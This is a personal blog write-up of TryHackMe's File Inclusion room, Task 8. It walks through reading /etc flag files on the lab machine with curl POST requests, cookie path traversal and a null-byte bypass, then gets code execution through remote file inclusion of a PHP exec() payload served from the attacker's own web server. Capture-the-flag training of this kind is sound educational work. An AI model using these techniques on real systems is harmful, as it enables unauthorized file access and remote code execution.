---
title: "THM: File Inclusion Writeup"

Created: February 20, 2022 4:26 PM
Last edited: February 20, 2022 10:42 PM
Tags: 
- Cybersecurity
- File Inclusion
- THM

layout: post
headerImage: false
category: blog
---

## Hi there !

I was doing the [File Inclusion](https://tryhackme.com/room/fileinc) room on TryHackMe. Most of the tasks, you can follow the instructions; however, I found the last one is challenging, so I thought of do the write-up on the last task—Task 8, giving some my thought process. Let's get started!

## Task 8:

1. Capture Flag1 at `/etc/flag1`
    
    If you try to get the file from the input, nothing is responding back. You can also try on the URL `[http://MACHINE_IP/challenges/chall1.php?file=../../../../etc/flag1](http://MACHINE_IP/challenges/chall1.php?file=../../../../etc/flag1)` , there is nothing responded. Well, if you look at the `Network` tab on the Firefox and see that it's calling with `GET` method. As the hint suggests: try using `POST` method. Alright, in my case, I'm using the `curl` on command line:
    
    ```bash
    $: curl http://MACHINE_IP/challenges/chall1.php -X POST -d "file=/etc/flag1"
    ```
    
    Hooray, the flag has been revealed!
    
2. Capture Flag2 at `/etc/flag2`
    
    Let's go to `[http://MACHINE_IP/challenges/chall2.php](http://MACHINE_IP/challenges/chall2.php)` You will see as the attached below:
    
    ![Untitled](/assets/posts/2022-02-20-THM-File-Inclusion-Writeup/Untitled.png)
    
    There is no input form, hmm, try adding the parameter to the URL 🤔 Let's try, `[http://MACHINE_IP/challenges/chall2.php?file=../../../../etc/flag2](http://MACHINE_IP/challenges/chall2.php?file=../../../../etc/flag2)` Nothing happens.
    
    Let's look at the `Development tool`, something interesting might be there. Look at the `Network` tab, the request is calling with `GET`; what if it's a `POST` , I try `curl` as the previous exercise, but still nothing happens. Hmm, the hint says that **"Checks the cookie"**, alright, it shows `THM=Guest` , let's try changing to `THM=admin` (you can change the cookie on `Storage` tab), then refresh the page... Oo-oh, something's changed!
    
    ![Untitled](/assets/posts/2022-02-20-THM-File-Inclusion-Writeup/Untitled%201.png)
    
    It has been revealed that there's the vulnerability on `cookie`, let's try changing to `/etc/flag2` There is some sort of input validation for `include()` function there, see below.
    
    ![Untitled](/assets/posts/2022-02-20-THM-File-Inclusion-Writeup/Untitled%202.png)
    
    Fine, let's do the path traversal: `THM=../../../../etc/flag2` And we got it! I'm not gonna show the flag 🤭
    
    ![Untitled](/assets/posts/2022-02-20-THM-File-Inclusion-Writeup/Untitled%203.png)
    
3. Capture Flag3 at `/etc/flag3`
    
    Let's go to the challenge 3 page. There is an input, so try getting `../../../../etc/flag3`
    
    ![Untitled](/assets/posts/2022-02-20-THM-File-Inclusion-Writeup/Untitled%204.png)
    
    Seems like it sanitizes the input and adds `.php` to the file name, smart! But, what if we request it using `curl` with `POST` Let's try.
    
    ```bash
    $: curl http://MACHINE_IP/challenges/chall3.php -X POST -d "file=/etc/flag3%00"
    ```
    
    You will get a warning that the output can mess your terminal, so don't forget to pass the output into a file! and let's look at your output file! 😎
    
4. Gain RCE in **Lab #Playground** `/playground.php` with RFI to execute the `hostname` command. What is the output?
    
    Follow the `Task 6: Remote File Inclusion - RFI` lab, but instead of `<?PHP echo "Hello THM"; ?>` , you will do
    
    ```php
    <?PHP print exec('hostname'); ?>
    ```
    
    Before calling our `cmd.txt` , don't forget to launch the local server. You can use `http.server` in Python3:
    
    ```python
    $: python3 -m http.server 8080
    ```
    
    In my case, I'm using port 8080; when I call via the url, it will be `[http://MACHINE_IP/playground.php?file=http://LOCAL_IP:8080/cmd.txt](http://MACHINE_IP/playground.php?file=http://LOCAL_IP:8080/cmd.txt)` There we go! The flag is on the screen.
    

We’re done 🎉